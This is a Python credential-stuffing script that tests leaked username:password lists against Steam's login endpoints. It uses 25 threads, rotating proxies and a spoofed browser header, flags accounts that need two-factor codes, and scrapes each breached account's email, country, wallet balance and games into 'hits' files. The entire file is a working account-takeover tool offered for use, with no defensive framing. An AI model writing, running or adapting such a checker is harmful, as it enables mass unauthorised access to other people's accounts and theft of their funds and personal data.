import os
import re
import time
import base64
import random
import threading
from urllib.parse import quote_plus
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from bs4 import BeautifulSoup
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

# === CONFIG ===
THREADS = 25
USE_PROXIES = False  # Set True to enable proxies from proxy.txt
ROTATE_PROXY_PER_REQUEST = True
DEBUG = False  # Set True to save HTML responses for debugging

COMBO_FILE = "combo.txt"
PROXY_FILE = "proxy.txt"
PROGRESS_FILE = "steam_progress.state"
HITS_FREE_FILE = "hits_free.txt"
HITS_CUSTOM_FILE = "hits_custom.txt"
ERROR_LOG = "errors.log"

BASE_URL = "https://steamcommunity.com"
GET_RSA_URL = f"{BASE_URL}/login/getrsakey/"
DO_LOGIN_URL = f"{BASE_URL}/login/dologin/"
ACCOUNT_URL = "https://store.steampowered.com/account/"

TIMEOUT = 20
MAX_RETRIES = 3
BACKOFF_BASE = 1.5
# ==============

lock_state = threading.Lock()
lock_file = threading.Lock()


def load_lines(file_path):
    if not os.path.isfile(file_path):
        return []
    with open(file_path, encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]


def save_progress(index):
    with lock_state:
        with open(PROGRESS_FILE, "w", encoding="utf-8") as f:
            f.write(str(index))


def load_progress():
    if not os.path.isfile(PROGRESS_FILE):
        return 0
    try:
        with open(PROGRESS_FILE, encoding="utf-8") as f:
            return int(f.read().strip())
    except Exception:
        return 0


def log_error(msg):
    with lock_file:
        with open(ERROR_LOG, "a", encoding="utf-8") as f:
            f.write(msg + "\n")


def write_hit(filename, line, email, country, balance, game, tag):
    with lock_file:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(f"[{tag}] {line} | Balance={balance}\n")


def proxy_dict(proxy_line):
    return {"http": proxy_line, "https": proxy_line}


def pick_proxy(proxies):
    if not USE_PROXIES or not proxies:
        return None
    return proxy_dict(random.choice(proxies))


def rsa_encrypt_password(mod_hex, exp_hex, password):
    n = int(mod_hex, 16)
    e = int(exp_hex, 16)
    pub_key = RSA.construct((n, e))
    cipher = PKCS1_v1_5.new(pub_key)
    encrypted = cipher.encrypt(password.encode("utf-8"))
    b64 = base64.b64encode(encrypted).decode()
    return quote_plus(b64)


def extract_value_between(text, left, right):
    """Extract text between left and right markers"""
    try:
        start = text.find(left)
        if start == -1:
            return ""
        start += len(left)
        end = text.find(right, start)
        if end == -1:
            return ""
        return text[start:end].strip()
    except Exception:
        return ""


def parse_account_info(html):
    """Parse account page for email, country, balance"""
    email = ""
    country = ""
    balance = ""
    
    # Try multiple parsing methods
    soup = BeautifulSoup(html, "lxml")
    
    # Method 1: Find by label text
    email_label = soup.find(string=re.compile(r"Email address", re.I))
    if email_label:
        parent = email_label.find_parent()
        if parent:
            email_span = parent.find_next("span", class_="account_data_field")
            if email_span:
                email = email_span.get_text(strip=True)
    
    # Method 2: Direct string search for email pattern
    if not email:
        email_match = re.search(r'[\w\.-]+@[\w\.-]+\.\w+', html)
        if email_match:
            email = email_match.group(0)
    
    # Country extraction
    country_spans = soup.find_all("span", class_="account_data_field")
    for span in country_spans:
        text = span.get_text(strip=True)
        if text and "@" not in text and len(text) > 1:
            country = text
            break
    
    # Balance extraction
    balance_div = soup.find("div", class_="accountData price")
    if not balance_div:
        balance_div = soup.find("div", class_=re.compile(r"accountData.*price"))
    if balance_div:
        balance = balance_div.get_text(strip=True)
    
    # Alternative balance search
    if not balance:
        balance_match = re.search(r'\$\d+\.\d{2}', html)
        if balance_match:
            balance = balance_match.group(0)
    
    return email, country, balance


def parse_games(html, username):
    """Parse games from profile"""
    # Try to find games in rgGames JavaScript variable
    games = []
    match = re.search(r'var rgGames = (\[.*?\]);', html, re.DOTALL)
    if match:
        try:
            games_str = match.group(1)
            # Extract game names using regex
            game_names = re.findall(r'"name":"([^"]+)"', games_str)
            if game_names:
                return game_names[0] if game_names else ""
        except Exception:
            pass
    
    # Alternative: search for JSON game data
    match2 = re.search(r'"name":"([^"]+?)","playtime_forever', html)
    if match2:
        return match2.group(1)
    
    return ""


def do_request(session, method, url, proxies_list=None, **kwargs):
    last_error = None
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            if ROTATE_PROXY_PER_REQUEST and USE_PROXIES and proxies_list:
                kwargs["proxies"] = pick_proxy(proxies_list)
            resp = session.request(method, url, timeout=TIMEOUT, **kwargs)
            if resp.status_code == 429:
                time.sleep(BACKOFF_BASE ** attempt + random.uniform(0, 0.5))
                continue
            return resp
        except Exception as e:
            last_error = e
            if attempt < MAX_RETRIES:
                time.sleep(BACKOFF_BASE ** attempt + random.uniform(0, 0.5))
    raise last_error


def process_combo(line, proxies):
    if ":" not in line:
        return "FAIL", "Invalid combo format"
    user, password = line.split(":", 1)
    user = user.strip()
    password = password.strip()

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9",
    })

    timestamp = str(int(time.time()))
    
    # Step 1: Get RSA public key
    try:
        rsa_data = f"donotcache={timestamp}&username={user}"
        headers1 = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": BASE_URL,
            "Referer": f"{BASE_URL}/login/",
        }
        r1 = do_request(session, "POST", GET_RSA_URL, data=rsa_data, headers=headers1, proxies_list=proxies)
        
        try:
            j = r1.json()
            if not j.get("success"):
                return "FAIL", "Failed to get RSA key"
            mod = j["publickey_mod"]
            exp = j["publickey_exp"]
            time_stamp = j["timestamp"]
        except Exception:
            return "FAIL", "RSA response parse error"
            
    except Exception as e:
        return "RETRY", f"RSA key request error: {e}"

    # Encrypt password
    try:
        enc_pass = rsa_encrypt_password(mod, exp, password)
    except Exception as e:
        return "FAIL", f"Password encryption failed: {e}"

    # Step 2: Login
    login_payload = (
        f"donotcache={timestamp}&password={enc_pass}&username={user}&twofactorcode=&emailauth="
        f"&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp={time_stamp}"
        f"&remember_login=true"
    )
    
    try:
        headers2 = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": BASE_URL,
            "Referer": f"{BASE_URL}/login/",
        }
        r2 = do_request(session, "POST", DO_LOGIN_URL, data=login_payload, headers=headers2, proxies_list=proxies)
        
        try:
            login_json = r2.json()
        except Exception:
            return "FAIL", "Login response not JSON"
        
        # Check for 2FA
        if login_json.get("requires_twofactor") or login_json.get("emailauth_needed"):
            write_hit(HITS_CUSTOM_FILE, line, "", "", "", "", "2FACTOR")
            return "HIT_CUSTOM", "2FACTOR required"
        
        # Check for captcha
        if login_json.get("captcha_needed"):
            return "FAIL", "Captcha required"
        
        # Check login success
        if not login_json.get("success"):
            msg = login_json.get("message", "Unknown error")
            return "FAIL", f"Login failed: {msg}"
        
        # Extract transfer info for cookies
        transfer_urls = login_json.get("transfer_urls", [])
        transfer_params = login_json.get("transfer_parameters", {})
        
        # Perform transfers to set cookies across Steam domains
        if transfer_urls and transfer_params:
            for url in transfer_urls:
                try:
                    session.post(url, data=transfer_params, timeout=10)
                except Exception:
                    pass
            
    except Exception as e:
        return "RETRY", f"Login request error: {e}"

    # Small delay to let cookies propagate
    time.sleep(0.5)

    # Step 3: Access account page
    try:
        headers3 = {
            "Referer": BASE_URL,
            "Upgrade-Insecure-Requests": "1",
        }
        r_acc = do_request(session, "GET", ACCOUNT_URL, headers=headers3, proxies_list=proxies)
        
        if DEBUG:
            with open(f"debug_{user}_account.html", "w", encoding="utf-8") as f:
                f.write(r_acc.text)
        
        email, country, balance = parse_account_info(r_acc.text)
        
    except Exception as e:
        return "RETRY", f"Account page error: {e}"

    # Step 4: Get games from profile
    game = ""
    try:
        profile_url = f"{BASE_URL}/id/{user}/games/?tab=all"
        r_games = do_request(session, "GET", profile_url, proxies_list=proxies)
        
        if DEBUG:
            with open(f"debug_{user}_games.html", "w", encoding="utf-8") as f:
                f.write(r_games.text)
        
        game = parse_games(r_games.text, user)
    except Exception:
        pass

    # Determine hit type
    is_free = False
    if balance:
        if "$0" in balance or "0.00" in balance or balance.strip() in ["$0", "$0.00"]:
            is_free = True
    else:
        is_free = True

    # Save hits
    if is_free:
        write_hit(HITS_FREE_FILE, line, email, country, balance or "$0.00", game, "FREE")
        return "HIT_FREE", f"Balance={balance or '$0.00'}"
    else:
        write_hit(HITS_CUSTOM_FILE, line, email, country, balance, game, "CUSTOM")
        return "HIT_CUSTOM", f"Balance={balance}"


def main():
    combos = load_lines(COMBO_FILE)
    proxies = load_lines(PROXY_FILE) if USE_PROXIES else []
    start = load_progress()
    total = len(combos)
    
    if not combos:
        print("No combos found in combo.txt")
        return
    
    if start >= total:
        print("All combos already processed.")
        return

    print(f"Starting at {start}/{total} combos with {THREADS} threads. Proxies: {'ON' if USE_PROXIES else 'OFF'}")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(process_combo, combos[i], proxies): i for i in range(start, total)}

        for future in as_completed(futures):
            idx = futures[future]
            combo_line = combos[idx]
            try:
                status, info = future.result()
            except Exception as e:
                status, info = "FAIL", str(e)

            save_progress(idx + 1)

            if status.startswith("HIT"):
                print(f"[{status}] {combo_line} -> {info}")
            else:
                log_error(f"[{status}] {combo_line} -> {info}")

    print("Done.")


if __name__ == "__main__":
    main()
